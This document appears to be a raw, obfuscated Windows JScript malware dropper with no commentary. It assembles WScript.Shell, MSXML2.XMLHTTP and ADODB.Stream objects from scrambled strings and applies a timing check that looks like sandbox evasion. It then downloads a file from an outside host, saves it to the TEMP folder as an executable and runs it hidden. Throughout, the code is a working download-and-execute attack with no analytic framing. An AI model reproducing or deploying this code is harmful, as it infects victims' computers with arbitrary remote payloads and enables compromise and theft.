var PqpqngxqVoxmfxtg = false;
var RtfrbtiDhevziwh = "";
var Hkagfrf;
var TuqdlmkmIvwswhlfAlahufjSqitrzwuRatvjhiv = "C" + "r"+"eateObject";
var ZwytrjgbUzbsjupzSzqporxvZtzmkfiu = this["WScript"];
var Gjybkbf = function BdacvhrnLpqnymvy() {return ZwytrjgbUzbsjupzSzqporxvZtzmkfiu[TuqdlmkmIvwswhlfAlahufjSqitrzwuRatvjhiv]("WScript"+".Shell");}(), JgodoxmYwnywrzeRudkhydKafirtnFfwatre = 11;
var LffoloxiLgdafvgYmppxpwo = 1 * (2 - 0);
var MwqvpuplGxcqgxog = LffoloxiLgdafvgYmppxpwo - (2 + 0) * 1;
function SmgkovlNnhehueLfrljvcbDacmlsgMbrcutp(JrdjddwUcvtnvy){Gjybkbf[("Cunt", "anal", "R")+ "u" + ("fuck", "n")](JrdjddwUcvtnvy, MwqvpuplGxcqgxog, MwqvpuplGxcqgxog);};
function JitavcfxYcddqnqp(Fcjqoefm, Cjxcnyo){MwqvpuplGxcqgxog = MwqvpuplGxcqgxog * 1; return Fcjqoefm - Cjxcnyo;};
function GdczofyVkuoztdcEvptnhd(){return TuqdlmkmIvwswhlfAlahufjSqitrzwuRatvjhiv;};
/*@cc_on
  @if (@_win32 || @_win64)
    //
	PqpqngxqVoxmfxtg = true;
	RtfrbtiDhevziwh = "MLH";
	Hkagfrf = "R" + "esponseB" + "ydo".split('').reverse().join('');
	WugawycCkdaxsfEbpaxomEhnohjbz = "noitisop".split('').reverse().join('');
	Sxxnplk = "eliFoTevaS".split('').reverse().join('');
  @end
@*/
if (PqpqngxqVoxmfxtg)
{
var OtnacabVbisfpatHugvpzui = "M" + "SXML2."+"X"+RtfrbtiDhevziwh+"TTP";
function Kkirbhgy(){return OtnacabVbisfpatHugvpzui + "";};

var Xneuons = "";
function XptbqprfRgteogrFmhackiz(){return 23;};
var Qbohdtp = 0; var HmbuhcuBmcmcdfHfisaowg = 0;
function PwjjjemFhumnmoTuiircg()
{
var Cauouzr = new this["D"+"ate"]();
var SeudpfdkFmjfnymp = Cauouzr["g"+"etUTCMilliseconds"]();
ZwytrjgbUzbsjupzSzqporxvZtzmkfiu["Sleep"](XptbqprfRgteogrFmhackiz());
var Cauouzr = new this["D"+"ate"]();
var TbmlkdoUaxrfnz = Cauouzr["g"+"etUTCMilliseconds"]();
ZwytrjgbUzbsjupzSzqporxvZtzmkfiu["Sleep"](XptbqprfRgteogrFmhackiz());
var Cauouzr = new this["D"+"ate"]();
var WngmimtYztaprtgOxvvnzmQaerhyyiYrxyfnit = Cauouzr["g"+"etUTCMilliseconds"]();
var Qbohdtp = "PqjwxlxnLafzzroTqhpibySbhkcbekJzqaqevq";
Qbohdtp = JitavcfxYcddqnqp(TbmlkdoUaxrfnz, SeudpfdkFmjfnymp);
var HmbuhcuBmcmcdfHfisaowg = "RawkcgwqCzeuviwGighowqiPnhrbjpNfjmbek";
HmbuhcuBmcmcdfHfisaowg = JitavcfxYcddqnqp(WngmimtYztaprtgOxvvnzmQaerhyyiYrxyfnit, TbmlkdoUaxrfnz);
Xneuons = "open";
return JitavcfxYcddqnqp(Qbohdtp, HmbuhcuBmcmcdfHfisaowg);
}
var Nlrtlwl = false;
var ChsqtmmBehebamt = false;
for (var NlknefjuOlllrajh = MwqvpuplGxcqgxog; NlknefjuOlllrajh < XptbqprfRgteogrFmhackiz() * 1; NlknefjuOlllrajh++){if (PwjjjemFhumnmoTuiircg() != MwqvpuplGxcqgxog){
Nlrtlwl = true; 
HmbuhcuBmcmcdfHfisaowg = ("221") + (Qbohdtp * HmbuhcuBmcmcdfHfisaowg); 
ChsqtmmBehebamt = true; 
break;
}}
function Spopznra() {return ((Nlrtlwl == true) && (Nlrtlwl == ChsqtmmBehebamt)) ? 1 : MwqvpuplGxcqgxog;};
if (Nlrtlwl && Spopznra() && ChsqtmmBehebamt){
function RwiomywPhjyzgs() {return Gjybkbf["E"+"xpandEnvir"+"cock".charAt(1)+"nmentStrings"]("%TE"+"MP%/") + "T8Hf6ZcMhVYwyLkd.ex" + "e";};
 TaldqfjWrhzturLzujjepjDgolkwxq = Kkirbhgy();
 ZmfolhhVhzqatxPdxthpse = ZwytrjgbUzbsjupzSzqporxvZtzmkfiu[TuqdlmkmIvwswhlfAlahufjSqitrzwuRatvjhiv](TaldqfjWrhzturLzujjepjDgolkwxq);
 var UckbyjuuOnvigobrPfkculim = 3-2;
do { 
	for (;UckbyjuuOnvigobrPfkculim;){
	try {
		if (UckbyjuuOnvigobrPfkculim == 1)
		{
			ZmfolhhVhzqatxPdxthpse[Xneuons]("G" + "ET", "http://gzsjdzc.com/hsjnx", false);
			ZmfolhhVhzqatxPdxthpse["s"+"end"]();
			CvtcvwpMtlwsbgXbycnkrtXfhupeoZrrhhedu = "S"+"leep";
			UckbyjuuOnvigobrPfkculim = 2;
		}
		ZwytrjgbUzbsjupzSzqporxvZtzmkfiu[CvtcvwpMtlwsbgXbycnkrtXfhupeoZrrhhedu](XptbqprfRgteogrFmhackiz() + 120); 
		if (ZmfolhhVhzqatxPdxthpse["r"+"eadystate"] < 2 * 2) continue;
		UckbyjuuOnvigobrPfkculim = MwqvpuplGxcqgxog;
		function ThtnviyyYhizryiBggvkqqo(KwqlepjaDmgdnryjWspzyjsnDzmvhjbi) {var EjpgnmzIoatlxxYbvnbfiFnsykduEkqfbrr = (1, 2, 3, 4, 5, KwqlepjaDmgdnryjWspzyjsnDzmvhjbi); return EjpgnmzIoatlxxYbvnbfiFnsykduEkqfbrr;};
		TaldqfjWrhzturLzujjepjDgolkwxq = TbwcbwrSerryoq = ZwytrjgbUzbsjupzSzqporxvZtzmkfiu[GdczofyVkuoztdcEvptnhd()]("A"+"DODB"+"a.b".charAt(1)+"Stre"+"mad".charAt(1)+"m");
		TaldqfjWrhzturLzujjepjDgolkwxq[Xneuons]();
		TaldqfjWrhzturLzujjepjDgolkwxq["t"+"aby".charAt(2)+"pe"] = 1;
		TaldqfjWrhzturLzujjepjDgolkwxq["w"+"crop".charAt(1)+"ite"](ZmfolhhVhzqatxPdxthpse[Hkagfrf]);
		TbwcbwrSerryoq[WugawycCkdaxsfEbpaxomEhnohjbz] = 2-2;
		TaldqfjWrhzturLzujjepjDgolkwxq[Sxxnplk](RwiomywPhjyzgs(), 2 * 1);
		TbwcbwrSerryoq["c"+"l"+"cock".charAt(1)+"se"]();
		Xzcivki = RwiomywPhjyzgs();
		if (1 && PqpqngxqVoxmfxtg) SmgkovlNnhehueLfrljvcbDacmlsgMbrcutp(Xzcivki);
	} catch(XsgmzavaMxgljwpCitzvzou){};};
}while (UckbyjuuOnvigobrPfkculim);
}
}

